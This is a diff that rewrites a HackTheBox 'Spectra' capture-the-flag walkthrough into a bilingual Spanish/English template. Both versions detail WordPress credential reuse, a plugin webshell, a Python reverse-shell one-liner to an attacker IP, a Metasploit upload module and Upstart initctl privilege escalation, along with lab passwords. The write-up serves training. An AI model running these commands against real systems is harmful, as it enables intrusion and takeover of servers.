@@ -1,214 +1,158 @@
-1, enumerate the ports and services
-22/tcp ssh
-80/tcp http `nginx 1.17.4`
-3306/tcp mysql `MySQL (unauthorized)`
+# Spectra [Easy]
 
-2, check the pages and services
-port 3306 (mysql)
-```
-mysql -h 10.10.10.229
+> **ES:** Máquina Linux Easy con WordPress 5.4.2 y dir `/testing` que expone `wp-config.php.save`; login reutilizado, shell vía plugin y root con `initctl` (Upstart job).
+> **EN:** Easy Linux box with WordPress 5.4.2 and a `/testing` dir exposing `wp-config.php.save`; reused login, shell via plugin, and root with `initctl` (Upstart job).
 
-ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.65' is not allowed to connect to this MySQL server
+| Campo | Valor |
+|-------|-------|
+| **Dificultad** | Easy |
+| **OS** | Linux |
+| **Estado** | Retired |
+| **Maker** | [verificar en app.hackthebox.com/machines/Spectra] |
+| **URL** | https://app.hackthebox.com/machines/Spectra |
+| **IP lab** | 10.10.10.229 |
+| **Fecha de resolución** | 2026-09-24 |
 
-```
+---
 
-port 80 (http), it is powered by `WordPress 5.4.2` and this service is separated into 2 part `\test` and `\main`.separate
+## 🎯 Objetivo / Goal
 
-We can find `http://spectra.htb/main/wp-login.php` from `\main` but we don't have any credients.
+> **ES:** Conseguir `user.txt` y `root.txt` vía WordPress (credencial reutilizada + plugin webshell) → `katie` (autologin) → job Upstart malicioso con `sudo /sbin/initctl`.
+> **EN:** Get `user.txt` and `root.txt` via WordPress (reused credential + plugin webshell) → `katie` (autologin) → malicious Upstart job with `sudo /sbin/initctl`.
 
-Let's check `\testing`, then it would redirect to `\testing\index.php`
+---
 
-But if we just check `\testing`, we would get the File Directory
-![](images/Pasted%20image%2020240901110425.png)
+## 🛠️ Herramientas usadas / Tools used
 
-Then we can just check some interesting files.
-`\wp-config.php` and `\wp-config.php.save` would be useful.
+- [ ] nmap
+- [ ] wpscan (versión 5.4.2, tema twentytwenty)
+- [ ] dirsearch / ffuf (`/main/ /testing/`)
+- [ ] curl (lectura `wp-config.php.save`)
+- [ ] Metasploit `wp_admin_shell_upload` (o edición manual de plugin)
+- [ ] mysql (MySQL remoto denegado)
+- [ ] ssh / sudo -l (initctl)
 
-```
-In some cases nano will try to dump the buffer into an emergency file. This will happen mainly if nano receives a SIGHUP or SIGTERM or runs out of memory. It will write the buffer into a file named nano.save if the buffer didn’t have a name already, or will add a “.save” suffix to the current filename. If an emergency file with that name already exists in the current directory, it will add “.save” plus a number (e.g. “.save.1”) to the current filename in order to make it unique. In multibuffer mode, nano will write all the open buffers to their respective emergency files.
-```
+---
 
-Clicking on it returns a blank page, but viewing the source (Ctrl-u, or fetching the page with curl) gives the text:
-```
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'dev' );
-/** MySQL database username */
-define( 'DB_USER', 'devtest' );
-/** MySQL database password */
-define( 'DB_PASSWORD', 'devteam01' );
-/** MySQL hostname */
-define( 'DB_HOST', 'localhost' );
-/** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
-```
-Then we get the database credit `devtest:devteam01`
+## 📋 Pasos / Steps
 
-Let's try to connect to the database, but very sadly we could not connect it even through we have the credit.
+### Paso 1 — Reconocimiento / Recon
 
-Let's come to the page of website, 
-![](images/Pasted%20image%2020240901111439.png)
+> **ES:** Puertos 22, 80 (nginx 1.17.4) y 3306 (MySQL rechaza hosts externos). La raíz enlaza a `/main/` (WordPress) y `/testing/` (listado de directorio); añadir `spectra.htb` a hosts.
+> **EN:** Ports 22, 80 (nginx 1.17.4) and 3306 (MySQL rejects external hosts). Root links to `/main/` (WordPress) and `/testing/` (directory listing); add `spectra.htb` to hosts.
 
-we can guess `# Author: administrator`
-
-Let's try this username, but `devtest:devteam01` is not correct 
-but `administrator:devteam01` is  correct and we successfully login to the dashboard.
-Firstly let's check the versions of plugins
-```
-# Plugins
-WordPress 5.4.2:
-**Akismet Anti-Spam** Version 4.1.5
-**Hello Dolly** Version 1.7.2
+```bash
+nmap -sC -sV -p- -oN nmap_init 10.10.10.229
+echo '10.10.10.229 spectra.htb' | sudo tee -a /etc/hosts
+mysql -h 10.10.10.229  # ERROR 1130: Host ... is not allowed to connect
 ```
 
-Theme Edit - Fail 
-There are many ways to try to go from admin login on WP to code execution. The first one I tried was to edit a theme to include a webshell. Under Appearance -> Theme Editor I get access to all the theme pages. I loaded 404 Template, and added a check to the top of the page:
-![](images/Pasted%20image%2020240901112411.png)
+**Resultado / Result:** WordPress en `/main/`, directorio listado en `/testing/`. Captura del listado en `images/`.
 
-When I save this, I can go to /main/wp-content/themes/twentytwenty/404.php to trigger it. However, when I try to save, it fails:
-![](images/Pasted%20image%2020240901112432.png)
+---
 
-This is a protection put in place to stop people from doing exactly what I’m trying to do.
+### Paso 2 — Enumeración / Enumeration
 
-Edit Existing Plugin:
-On the Plugins tab, there are two existing plugins:
-![](images/Pasted%20image%2020240901112658.png)
+> **ES:** `wpscan` confirma WP 5.4.2 (tema twentytwenty, XML-RPC activo). En `/testing/` hay `wp-config.php.save` legible (emergencia de nano): contiene `devtest : devteam01` (DB `dev`). Esa clave no entra en MySQL remoto ni como `devtest` en WP, pero reutilizada como `administrator : devteam01` en `wp-login.php` sí abre el dashboard (autor visible en la web: `administrator`).
+> **EN:** `wpscan` confirms WP 5.4.2 (twentytwenty theme, XML-RPC enabled). `/testing/` has a readable `wp-config.php.save` (nano emergency file): it holds `devtest : devtest01`-style `devtest:devteam01` (DB `dev`). That password fails on remote MySQL and as `devtest` in WP, but reused as `administrator : devteam01` at `wp-login.php` opens the dashboard (author visible on the site: `administrator`).
 
-I’ll click on the Plugin Editor (in the menu on the left), and it takes me to the editor with Akismet Anti-Spam loaded and akismet.php in the editor:
-![](images/Pasted%20image%2020240901112711.png)
-
-I can find this plugin at `[WP root]/wp-content/plugins/[plugin name]/[filename]`:
-
-`curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php`
-
-I’ll add a bit of code at the top to make it a webshell only if the parameter 0xdf is there:
-![](images/Pasted%20image%2020240901113922.png)
-
-`curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?0xdf=id`
-
-Shell
-With either webshell, getting a shell is as simple as passing it a reverse shell. I like to use curl so it’s repeatable.
-It doesn’t look like nc is on the host, so that eliminates several command reverse shells. I got the Python one to work:
-```
-curl http://spectra.htb/main/wp-content/plugins/wither/wither.php --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.65\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+```bash
+wpscan --url http://spectra.htb/main/ --enumerate u,p
+# WP 5.4.2, theme twentytwenty, xmlrpc enabled, plugins: Akismet 4.1.5, Hello Dolly 1.7.2
+curl -s http://spectra.htb/testing/wp-config.php.save
+# define('DB_NAME','dev'); define('DB_USER','devtest'); define('DB_PASSWORD','devteam01');
 ```
 
-Then I’ll upgrade my shell:
-`python -c 'import pty;pty.spawn("bash")'`
+**Resultado / Result:** Login válido al admin de WordPress (`administrator:devteam01`, credencial de laboratorio retirado). Capturas del login en `images/` y en `img/image_20240323-142344.png`.
 
-Then let's enumerate the database:
-There is a tricky thing, our before credit is not useful in this time, so we need to check the `wp-config.php` again:
-```
-define( 'DB_NAME', 'dev' );
+---
 
-/** MySQL database username */
-define( 'DB_USER', 'dev' );
+### Paso 3 — Acceso inicial (foothold) / Initial access
 
-/** MySQL database password */
-define( 'DB_PASSWORD', 'development01' );
+> **ES:** La edición de temas está bloqueada (falla al guardar `404.php`), pero el editor de plugins sí permite inyectar webshell en `akismet.php` condicionada a un parámetro (o subir plugin/ZIP manual, o módulo `wp_admin_shell_upload`) → shell como `nginx`. No hay `nc` en el host: reverse por Python.
+> **EN:** Theme editing is blocked (saving `404.php` fails), but the plugin editor allows injecting a webshell into `akismet.php` gated by a parameter (or manual plugin/ZIP upload, or `wp_admin_shell_upload` module) → shell as `nginx`. No `nc` on the host: Python reverse shell.
 
-/** MySQL hostname */
-define( 'DB_HOST', 'localhost' );
-
-/** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
-
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
+```bash
+# en Plugin Editor (akismet.php), anteponer webshell condicionada a ?0xdf=
+curl 'http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?0xdf=id'
+# reverse (python, sin nc):
+curl http://spectra.htb/main/wp-content/plugins/wither/wither.php --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<TU-IP>\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+# alternativa metasploit:
+msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS 10.10.10.229; set TARGETURI /main; set USERNAME administrator; set PASSWORD devteam01; set LHOST <TU-IP>; exploit"
+python3 -c 'import pty; pty.spawn("bash")'
+whoami  # nginx (host spectra)
 ```
 
-This time `dev:development01`
-`administrator | $P$BNlisfpKSFVhrcykt03B/pidcUfNmL0`
-I must say this would be rabbit hole, because it is our password before.
+**Resultado / Result:** Shell web como `nginx`. Capturas del editor en `images/`.
 
-Let's check others:
-/etc/lsb-release solves the mystery about the OS:
-```
-cat /etc/lsb-release 
+---
 
-GOOGLE_RELEASE=87.3.41
-CHROMEOS_RELEASE_BRANCH_NUMBER=85
-CHROMEOS_RELEASE_TRACK=stable-channel
-CHROMEOS_RELEASE_KEYSET=devkeys
-CHROMEOS_RELEASE_NAME=Chromium OS
-CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update
-CHROMEOS_RELEASE_BOARD=chromeover64
-CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/
-CHROMEOS_RELEASE_BUILD_NUMBER=13505
-CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1}
-CHROMEOS_RELEASE_CHROME_MILESTONE=87
-CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352
-CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
-CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
-CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware
-CHROMEOS_RELEASE_VERSION=87.3.41
-CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64
+### Paso 4 — Usuario (user.txt) / User
+
+> **ES:** El sistema es Chromium OS (`/etc/lsb-release`, homes `chronos/katie/nginx/root/user`). En `/etc/autologin/passwd` hay password en claro `SummerHereWeCome!!` (ver `/opt/autologin.conf.orig`); corresponde a `katie` (`/home/katie`, shell bash) → SSH y lectura de `user.txt`. El `wp-config.php` real (`dev:development01`, hash phpass `$P$B…` de administrator) es rabbit hole.
+> **EN:** The system is Chromium OS (`/etc/lsb-release`, homes `chronos/katie/nginx/root/user`). `/etc/autologin/passwd` holds cleartext `SummerHereWeCome!!` (see `/opt/autologin.conf.orig`); it belongs to `katie` (`/home/katie`, bash shell) → SSH and read `user.txt`. The real `wp-config.php` (`dev:development01`, phpass `$P$B…` hash of administrator) is a rabbit hole.
+
+```bash
+cat /etc/lsb-release  # Chromium OS / CHROMEOS_RELEASE_*
+cat /etc/autologin/passwd  # SummerHereWeCome!! (credencial de laboratorio retirado)
+grep katie /etc/passwd  # katie:x:20156:20157::/home/katie:/bin/bash
+ssh katie@spectra.htb
+cat /home/katie/user.txt  # formato: e89d... (ofuscado)
+sudo -l  # (ALL) SETENV: NOPASSWD: /sbin/initctl
 ```
 
-It’s Chrome! And there are users in `/home`
-`chronos  katie  nginx  root  user`
+**Resultado / Result:** SSH como `katie` → `user.txt`. `katie` puede correr `(ALL) SETENV: NOPASSWD: /sbin/initctl`.
 
-There is a interesting file in /opt:
-```
-/opt/autologin.conf.orig
+---
 
-# Copyright 2016 The Chromium OS Authors. All rights reserved.
-# Use of this source code is governed by a BSD-style license that can be
-# found in the LICENSE file.
-description   "Automatic login at boot"
-author        "chromium-os-dev@chromium.org"
-# After boot-complete starts, the login prompt is visible and is accepting
-# input.
-start on started boot-complete
-script
-  passwd=
-  # Read password from file. The file may optionally end with a newline.
-  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
-    if [ -e "${dir}/passwd" ]; then
-      passwd="$(cat "${dir}/passwd")"
-      break
-    fi
-  done
-  if [ -z "${passwd}" ]; then
-    exit 0
-  fi
-  # Inject keys into the login prompt.
-  #
-  # For this to work, you must have already created an account on the device.
-  # Otherwise, no login prompt appears at boot and the injected keys do the
-  # wrong thing.
-  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
+### Paso 5 — Root (root.txt) / Privilege escalation
+
+> **ES:** `initctl` (Upstart) ejecuta jobs de `/etc/init/*.conf` como root; el job de pruebas `test`/`test.conf` (servidor node de `katie`, con `/srv/nodetest.js` en 8081) es escribible. Se reescribe su bloque `script` con `chmod +s /bin/bash`, se arranca con `sudo /sbin/initctl start test` y `/bin/bash -p` es root.
+> **EN:** `initctl` (Upstart) runs jobs from `/etc/init/*.conf` as root; the `test`/`test.conf` test job (`katie`'s node server, `/srv/nodetest.js` on 8081) is writable. Rewrite its `script` block with `chmod +s /bin/bash`, start it with `sudo /sbin/initctl start test`, and `/bin/bash -p` is root.
+
+```bash
+sudo -l  # (ALL) SETENV: NOPASSWD: /sbin/initctl
+sudo /sbin/initctl list  # ... test stop/waiting ...
+cat /etc/init/test.conf  # job "Test node.js server" de katie (escribible)
+# reescribir el bloque script:
+# script
+#         chmod +s /bin/bash
+# end script
+sudo /sbin/initctl start test  # test start/running, process 5172
+ls -lh /bin/bash  # -rwsr-sr-x 1 root root
+/bin/bash -p
+whoami  # root
+cat /root/root.txt  # formato parcial ofuscado
 ```
 
-This means there would be a password file in `/mnt/stateful_partition/etc/autologin /etc/autologin`
-Then we get `SummerHereWeCome!!`
+**Resultado / Result:** Root vía job Upstart malicioso (`/etc/init/test.conf` → SUID en bash). Técnica: abuso de `initctl` con sudo NOPASSWD. Capturas en `images/`.
 
-And check the `/etc/passwd` , we can get a username
-`katie:x:20156:20157::/home/katie:/bin/bash` and we can use ssh to login the machine.
+---
 
-Continue check `sudo -l`
-```
-User katie may run the following commands on spectra:
-    (ALL) SETENV: NOPASSWD: /sbin/initctl
-```
+## 🧠 Lo aprendido / Learned
 
-```
-initctl is a command used in older Linux distributions that use the Upstart init system. Upstart was designed to handle starting of tasks and services during boot, stopping them during shutdown, and supervising them while the system is running. The initctl command allows you to interact with the Upstart init system, enabling you to start, stop, restart, and check the status of services.
-```
+> **ES:** Backups con extensión `.save` servidos en claro; reutilización DB→admin; webshell vía plugins WP (temas bloqueados); Chromium OS/autologin como fuente de creds; privesc con jobs Upstart escribibles + `SETENV` NOPASSWD.
+> **EN:** Backups with `.save` extension served in clear; DB→admin reuse; webshell via WP plugins (themes blocked); Chromium OS/autologin as cred source; privesc with writable Upstart jobs + NOPASSWD `SETENV`.
 
-```
-As you can seen in figure 01 initctl own SUDO privileges. Usually initctl works with service configuration file located at /etc/init directory on linux servers. mmmmm. so What if we can inject malicious code into that services. Let’s try
-```
-![](images/Pasted%20image%2020240901115650.png)
+- [ ] `wpscan` + revisión manual de `/testing/` (`.save`)
+- [ ] `wp_admin_shell_upload` / edición de plugin
+- [ ] `sudo (ALL) SETENV: NOPASSWD: /sbin/initctl` + job malicioso
 
-And we can check current status of the services using list command via initctl.
+---
 
-Let’s try to inject a code which set SUID permission /bin/bash from that attack can takeover bash shell as root by modifying service “test” (which is customized service, does not come up as default job)
-![](images/Pasted%20image%2020240901120143.png)
+## 📚 Fuentes y Referencias / Sources
 
-`sudo /sbin/initctl start test`
+- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
+- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: nano `.save`, Chromium OS, `autologin.conf.orig`, job `test`) — wither/nota migrada
+- **Referencia técnica:** GTFOBins — init (privesc sudo) — https://gtfobins.github.io/gtfobins/init/ — GTFOBins
+- **Fecha de acceso:** 2026-09-24
+- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
 
-Then we can just `/bin/bash -p`
-And we can as the root.
+---
+
+## ⚠️ Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.
+
+_Fecha de edición: 2026-09-24_
